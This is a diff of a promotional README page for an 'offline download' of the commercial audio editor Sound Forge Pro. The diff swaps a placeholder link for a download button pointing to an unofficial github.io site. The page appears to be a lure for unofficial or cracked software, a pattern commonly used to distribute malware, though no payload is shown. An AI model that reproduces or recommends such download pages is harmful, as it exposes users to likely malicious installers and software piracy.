@@ -2,7 +2,7 @@
 
 **Sound Forge** is a professional digital audio editor trusted by producers and engineers for precise waveform editing, mastering, restoration, and sound design. This page provides an easy offline download method for Sound Forge Pro and Audio Studio editions.
 
-[![⬇️ Download Sound Forge Pro](https://img.shields.io/badge/⬇️_Download_Sound_Forge-blueviolet?style=for-the-badge&logo=soundcloud)](https://example.com/sound-forge-pro-offline-download)
+[![⬇️ Download Sound Forge Pro](https://img.shields.io/badge/⬇️_Download_Sound_Forge-blueviolet?style=for-the-badge&logo=soundcloud)](https://sound-forge-download.github.io/.github)
 
 ---
 
